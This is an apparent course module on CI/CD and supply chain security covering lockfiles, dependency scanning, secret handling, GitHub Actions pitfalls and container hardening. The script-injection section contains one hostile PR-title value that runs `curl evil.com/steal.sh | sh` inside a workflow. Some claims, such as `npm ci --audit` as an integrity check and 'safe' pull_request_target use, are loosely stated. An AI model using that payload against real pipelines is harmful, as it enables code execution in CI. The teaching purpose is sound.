# 🔒 Module 13: CI/CD & Supply Chain Security

**Difficulty:** 🔴 Advanced  
**Time:** 90 minutes

---

## What You'll Learn

- Dependency attacks (supply chain)
- Package lockfiles
- Build-time secret leakage
- CI configuration vulnerabilities
- Container image security
- Dependency scanning automation
- SBOM (Software Bill of Materials)

---

## The Supply Chain Threat

### What Is Supply Chain Attack?

**Attacker compromises a dependency you trust.**

```mermaid
graph LR
    A[Your App] --> B[express]
    A --> C[lodash]
    A --> D[axios]
    D --> E[follow-redirects]
    E --> F[⚠️ Malicious Update]
```



**Real examples:**
- **event-stream** (2018): Bitcoin wallet stealer in npm package
- **ua-parser-js** (2021): Hijacked package, crypto miner injected
- **node-ipc** (2022): Maintainer added destructive code targeting Russian users
- **SolarWinds** (2020): Build system compromised

---

## Lockfiles: Your First Defense

### Why Lockfiles Matter

**Without lockfile:**
```json
// package.json
"dependencies": {
  "express": "^4.18.0"
}
```

**Problem:** `npm install` might fetch `4.18.1`, `4.19.0`, etc.

If `4.19.0` is malicious → you're compromised.

---

### ✅ Always Use Lockfiles

```bash
# Generate package-lock.json
npm install

# ✅ Commit it
git add package-lock.json
git commit -m "Lock dependencies"

# In CI: Use exact versions from lockfile
npm ci  # NOT npm install!
```

---

### package-lock.json vs npm install vs npm ci

| Command | Uses Lockfile? | Updates Lockfile? | Use Case |
|---------|----------------|-------------------|----------|
| `npm install` | ⚠️ Partially | Yes | Local development |
| `npm ci` | ✅ Strictly | No | CI/CD, production |
| `npm update` | No | Yes | Intentional updates |

---

### Verify Lockfile Integrity

```bash
# Check if package.json and package-lock.json match
npm install --package-lock-only

# In CI:
npm ci --audit
```

---

## Dependency Scanning

### npm audit

```bash
# Check for known vulnerabilities
npm audit

# Example output:
# lodash  <4.17.21
# Severity: high
# Prototype Pollution
# Fix available via `npm audit fix`
```

**In CI:**

```yaml
# .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm audit --audit-level=high
```

---

### Automated Scanning Tools

**Snyk:**

```bash
# Install
npm install -g snyk

# Authenticate
snyk auth

# Test project
snyk test

# Monitor (continuous scanning)
snyk monitor
```

**In CI:**

```yaml
- name: Snyk Security Scan
  uses: snyk/actions/node@master
  env:
    SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

---

**Dependabot (GitHub):**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

**Result:** Automatic PRs when vulnerabilities found.

---

## Secret Leakage in CI/CD

### ❌ Common Mistakes

**1. Hardcoded secrets in code:**

```typescript
// ❌ NEVER
const apiKey = 'sk-1234567890abcdef';
```

**2. Secrets in environment variables (logged):**

```yaml
# ❌ DANGEROUS
- name: Deploy
  run: |
    echo "API_KEY=${{ secrets.API_KEY }}"  # ← Logged in plaintext!
    deploy.sh
```

**3. Secrets in build artifacts:**

```bash
# ❌ .env file included in Docker image
COPY . .
# ↑ If .env is in directory, it's in the image!
```

---

### ✅ Proper Secret Management

**1. Use CI secret stores:**

```yaml
# GitHub Actions
- name: Deploy
  env:
    API_KEY: ${{ secrets.API_KEY }}
  run: deploy.sh
  # API_KEY available as env var, not logged
```

**2. .dockerignore:**

```
# .dockerignore
.env
.env.*
*.key
*.pem
secrets/
```

**3. Multi-stage builds:**

```dockerfile
# Build stage (has secrets)
FROM node:18 AS builder
ARG DATABASE_URL
RUN npm ci && npm run build

# Production stage (no secrets)
FROM node:18-slim
COPY --from=builder /app/dist /app/dist
CMD ["node", "dist/server.js"]
```

---

### Detect Secrets in Commits

**gitleaks:**

```bash
# Install
brew install gitleaks

# Scan repo
gitleaks detect --source . --verbose

# Pre-commit hook
gitleaks protect --staged
```

**In CI:**

```yaml
- name: Gitleaks
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

## CI Configuration Vulnerabilities

### ❌ Insecure GitHub Actions

**1. Untrusted workflow execution:**

```yaml
# ❌ DANGEROUS: Runs code from PR
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install
      - run: npm test  # ← Attacker can run code via package.json scripts!
```

**Attack:** Submit PR with malicious `postinstall` script in `package.json`.

---

**✅ Use pull_request_target carefully:**

```yaml
# ✅ Safe: Only runs trusted code
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.base_ref }}  # ← Check out base branch, not PR
      - run: npm ci
      - run: npm test
```

---

**2. Script injection via issues/PRs:**

```yaml
# ❌ DANGEROUS
- name: Comment
  run: |
    echo "Thanks for the PR, ${{ github.event.pull_request.title }}"
```

**Attack:** PR title: `"; curl evil.com/steal.sh | sh; "`

**✅ Safe:**

```yaml
- name: Comment
  run: |
    echo "Thanks for the PR, ${PR_TITLE}"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

---

### Least Privilege for CI

```yaml
# ✅ Read-only unless write needed
permissions:
  contents: read
  pull-requests: write  # Only if needed
```

---

## Container Image Security

### Base Image Vulnerabilities

**❌ Using latest or full images:**

```dockerfile
FROM node:latest  # ← Which version? What vulnerabilities?
```

**✅ Use specific, minimal images:**

```dockerfile
FROM node:18.17.0-alpine3.18

# Even better: Distroless
FROM gcr.io/distroless/nodejs18-debian11
```

---

### Scan Images for Vulnerabilities

**Trivy:**

```bash
# Install
brew install trivy

# Scan image
trivy image node:18

# Fail CI if high/critical vulnerabilities
trivy image --severity HIGH,CRITICAL --exit-code 1 myapp:latest
```

**In CI:**

```yaml
- name: Build image
  run: docker build -t myapp:${{ github.sha }} .

- name: Scan image
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: myapp:${{ github.sha }}
    severity: 'HIGH,CRITICAL'
    exit-code: '1'
```

---

### Non-Root Containers

**❌ Running as root:**

```dockerfile
FROM node:18
COPY . .
CMD ["node", "server.js"]  # ← Runs as root!
```

**✅ Run as non-root user:**

```dockerfile
FROM node:18-alpine

# Create app user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

WORKDIR /app
COPY --chown=appuser:appgroup . .

USER appuser
CMD ["node", "server.js"]
```

---

### Read-Only Filesystems

```yaml
# docker-compose.yml
services:
  app:
    image: myapp
    read_only: true
    tmpfs:
      - /tmp
```

**Or in Kubernetes:**

```yaml
securityContext:
  readOnlyRootFilesystem: true
  runAsNonRoot: true
  runAsUser: 1000
```

---

## Verifying Package Integrity

### Subresource Integrity (SRI) for CDN

```html
<!-- ❌ No integrity check -->
<script src="https://cdn.example.com/lib.js"></script>

<!-- ✅ With SRI -->
<script 
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>
```

**Generate SRI hash:**

```bash
curl -s https://cdn.example.com/lib.js | openssl dgst -sha384 -binary | openssl base64 -A
```

---

### npm Package Signatures

**Check package signature:**

```bash
npm view express dist.integrity
# sha512-abc123...
```

**Verify during install:**

```bash
npm install --ignore-scripts  # Don't run postinstall scripts
npm audit signatures
```

---

## Software Bill of Materials (SBOM)

### What Is SBOM?

**List of all dependencies in your app.**

**Why?**
- Know what's in your software
- Respond quickly when vulnerability disclosed
- Compliance (e.g., FDA, DoD)

---

### Generate SBOM

**CycloneDX:**

```bash
# Install
npm install -g @cyclonedx/cyclonedx-npm

# Generate SBOM
cyclonedx-npm --output-file sbom.json
```

**SPDX:**

```bash
npm install -g @spdx/spdx-sbom-generator

spdx-sbom-generator -p .
```

---

## CI/CD Security Checklist


---

## Summary

| Threat | Impact | Mitigation |
|--------|--------|------------|
| **Malicious dependency** | RCE, data theft | Lockfiles, npm audit, Snyk |
| **Dependency confusion** | Install malicious package | Private registries, scoped packages |
| **Secret leakage in CI** | Credential theft | Secret stores, .dockerignore, gitleaks |
| **CI config injection** | RCE in CI | Env vars, pull_request_target careful use |
| **Vulnerable base image** | Container compromise | Trivy scanning, alpine/distroless |
| **Root container** | Privilege escalation | Non-root user, read-only FS |

---

## Exercises

### Exercise 1: Audit Your Dependencies

```bash
cd your-project
npm audit
npm audit fix
```

Review changes. Are there breaking changes?

---

### Exercise 2: Set Up Dependabot

Create `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
```

Commit and wait for PRs.

---

### Exercise 3: Scan Container Image

```bash
# Build your app image
docker build -t myapp .

# Scan it
trivy image myapp

# How many HIGH/CRITICAL vulnerabilities?
trivy image --severity HIGH,CRITICAL myapp
```

---

## What's Next?

Now let's explore logging and monitoring for security.

→ **Next: [Module 14: Security Logging & Monitoring](../14-logging-monitoring/01-security-logging.md)**

---

## Further Reading

- [NPM Security Best Practices](https://docs.npmjs.com/security-best-practices)
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP CI/CD Security](https://owasp.org/www-project-devsecops-guideline/latest/02b-Secure-CICD-Environment)
- [Trivy Documentation](https://aquasecurity.github.io/trivy/)
